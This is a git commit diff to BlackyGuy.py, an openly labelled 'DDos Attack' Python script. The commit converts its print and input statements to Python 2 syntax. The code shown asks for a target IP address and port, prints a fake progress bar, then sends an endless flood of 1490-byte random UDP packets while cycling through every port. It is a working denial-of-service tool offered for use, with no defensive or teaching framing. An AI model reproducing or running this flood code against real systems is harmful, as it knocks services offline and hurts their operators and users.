f866c9743e51641933f5c6b0d1515f489558a3d4
BlackyGuy <99073650+Blackyguy@users.noreply.github.com>
2022-02-05 20:11:16 +0800

    Update BlackyGuy.py

--- BlackyGuy.py
+++ BlackyGuy.py
@@ -18,29 +18,33 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("DDos Attack")
-print("Author:BlackyGuy")
-print("From: your heart")
-ip = int(input("ip: "))
-port = input("Port       : ")
+os.system("figlet DDos Attack")
+
+print
+print "Author   : BlackyGuy"
+print "From   : Your heart"
+print
+
+ip = raw_input("ip address : ")
+port = input  ("port      : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print("[                    ] 0% ")
+print "[                    ] 0% "
 time.sleep(5)
-print("[=====               ] 25%")
+print "[=====               ] 25%"
 time.sleep(5)
-print("[==========          ] 50%")
+print "[==========          ] 50%"
 time.sleep(5)
-print("[===============     ] 75%")
+print "[===============     ] 75%"
 time.sleep(5)
-print("[====================] 100%")
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     print "Sent %s packet to %s throught Port"%(sent,ip)
      if port == 65534:
        port = 1
